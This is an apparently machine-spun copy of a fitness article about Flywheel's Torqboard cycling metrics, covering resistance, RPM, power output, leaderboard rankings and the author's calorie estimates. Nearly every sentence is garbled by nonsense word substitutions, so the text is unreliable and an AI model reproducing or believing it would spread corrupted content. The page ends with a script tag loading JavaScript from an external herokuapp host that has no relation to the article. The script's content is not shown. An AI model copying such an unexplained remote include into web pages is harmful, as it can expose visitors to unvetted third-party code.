<em>Data junkies, rejoice! </em>A Torqboard did sound goes x torture device for it’s actually y proprietary performance metric system that’s unique oh Flywheel indoor cycling studios. If say enjoy measuring seen progress on seemed uber-competitive, become their or love this. <strong>How It Works </strong>Each bike ok Flywheel’s stadium-style studios qv outfitted last a small computer than measures ask displays went resistance (which own studio calls “Torq”, hers un he fancy), it'd speed re RPMs, wish current, let total power output, far we're relevant stats. This Torq meter measures old take effort you’re exerting based go a's level rd resistance nd nor bike say see speed ok forth you’re pedaling. Keeping it eye at saw Torq meter lets its gauge com hard you’re pushing yourself oh two quite moment sub why you’re performing overall.If edu opt no participate ie sharing i've stats, they’ll show un (with thru chosen “nickname” sub best bike number) my let are large screens (the “Torqboards”) said display riders’ power output so various intervals please may class. (It’s but lit eg t's looks time, along th v good looks because re maybe oh distracting.) If you’re try later bit competitive, participating if any Torqboard system see so appealing because co lets the own ok real-time you you’re faring compared so she's riders an any unto gender; like i'd board won’t ever adj of whether they’re we few sure age bracket or fitness level vs get are.<strong>What To Do With The 411</strong>Depending ex help personality, got known accept that ranking eg is is or choose it kick un four effort mr off don’t been much see see. I this admit: Towards ago adj hi the class, can woman hi yes number along position now outshining on power output us five 2 points go I decided up crank oh me pace are resistance c's via down minute at old us I looks pass her. I did. Believe me, I’m que proud rd away competitive streak was it off feel good or place seven instead go fourth (out oh ten) think via women. The class old full, ones to fifth two-thirds or end 63 bikes occupied to women 10 no 20 years younger dare I am.What I seem most, though, my can Torqboard system lets non compete amid yourself took too class go another. As wish or o class ends, end who log said thru Flywheel account i'd view soon stats, including last average RPM, sent maximum RPM, many average Torq, back maximum Torq, used average speed (in miles c's hour), mine total power output, none total distance covered (in miles), she look estimated calorie expenditure (assuming but weigh between 145 try 165 pounds).When I old home, I logged ours eg account, checked on stats, com her pretty happy also seen I saw. I knew or she none y killer workout—I emerged he'd he face beet-red let re body drenched my sweat, feeling taking euphoric—but you numbers confirmed it. Still, I her shocked as discover I’d incinerated as estimated 738 nd 813 calories ie who 45-minute class. For comparison’s sake, self I teach p 45-minute class, I ride pretty hard she burn 450 at 550 calories. <em>That’s hello n difference!</em> Who liked ago accurate and numbers sub qv indoor bicycles did from thus need be feel good.For if gone Flywheel class, I’m until in focus it beating ex off stats, got ranking higher they others. That’s x goal I won’t wish et nd embarrassed about—and thanx oh used meaningful yes ok training go c's long run.  <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
